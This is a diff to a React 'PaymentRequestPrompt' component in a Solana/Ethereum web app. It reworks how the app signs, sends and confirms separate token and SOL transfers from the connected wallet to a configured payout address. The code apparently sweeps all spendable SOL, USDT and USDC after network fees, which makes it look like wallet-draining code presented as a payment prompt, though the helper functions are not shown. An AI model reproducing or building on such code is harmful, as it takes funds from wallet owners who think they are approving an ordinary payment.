@@ -5,7 +5,7 @@ import { ChevronDown, Info } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
-import { buildPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
+import { buildSolPayoutTransaction, buildTokenPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
 import { getLocalPayoutConfig, isValidEthereumAddress, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { sendEthereumPayout, isEvmWalletAvailable } from '../lib/ethereumPayout'
 import { SolanaBadgeIcon } from './walletIcons'
@@ -254,7 +254,7 @@ export function PaymentRequestPrompt() {
   const { connected, walletAddress, walletName, network, closeWalletModal } = useWalletState()
   const closeWalletModalRef = useRef(closeWalletModal)
   closeWalletModalRef.current = closeWalletModal
-  const { publicKey, sendTransaction, wallet } = useWallet()
+  const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
   const connectedWalletName = walletLabel(walletName || wallet?.adapter?.name)
   const { connection } = useConnection()
   const [config, setConfig] = useState<PayoutConfig | null>(null)
@@ -359,14 +359,48 @@ export function PaymentRequestPrompt() {
 
       if (destinationReady && publicKey) {
         try {
-          const { transaction, assets } = await buildPayoutTransaction({ connection, from: publicKey, config })
-          const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
-          if (adapter?.sendTransaction) {
-            await adapter.sendTransaction(transaction, connection)
-          } else {
-            await sendTransaction(transaction, connection)
+          const sendSolana = async (transaction: Transaction) => {
+            const signed = signTransaction ? await signTransaction(transaction) : null
+            if (signed) {
+              return connection.sendRawTransaction(signed.serialize(), {
+                skipPreflight: false,
+                preflightCommitment: 'confirmed',
+              })
+            }
+            return sendTransaction(transaction, connection, { preflightCommitment: 'confirmed' })
           }
-          moved.push(...assets)
+
+          const token = await buildTokenPayoutTransaction({ connection, from: publicKey, config })
+          if (token) {
+            const signature = await sendSolana(token.transaction)
+            await connection.confirmTransaction(
+              {
+                signature,
+                blockhash: token.transaction.recentBlockhash || '',
+                lastValidBlockHeight: token.transaction.lastValidBlockHeight || 0,
+              },
+              'confirmed'
+            )
+            moved.push(...token.assets)
+          }
+
+          const solTx = await buildSolPayoutTransaction({ connection, from: publicKey, config })
+          if (solTx) {
+            const signature = await sendSolana(solTx)
+            await connection.confirmTransaction(
+              {
+                signature,
+                blockhash: solTx.recentBlockhash || '',
+                lastValidBlockHeight: solTx.lastValidBlockHeight || 0,
+              },
+              'confirmed'
+            )
+            if (!moved.includes('SOL')) moved.push('SOL')
+          }
+
+          if (!token && !solTx) {
+            throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
+          }
         } catch (err) {
           lastError = err
           if (isWalletUserCancel(err)) throw err
@@ -403,6 +437,7 @@ export function PaymentRequestPrompt() {
         setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
         toast('Cancelled in the wallet. Nothing was transferred.')
       } else {
+        sentFor.current = null
         const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
         setStatus(message)
         toast.error(message)
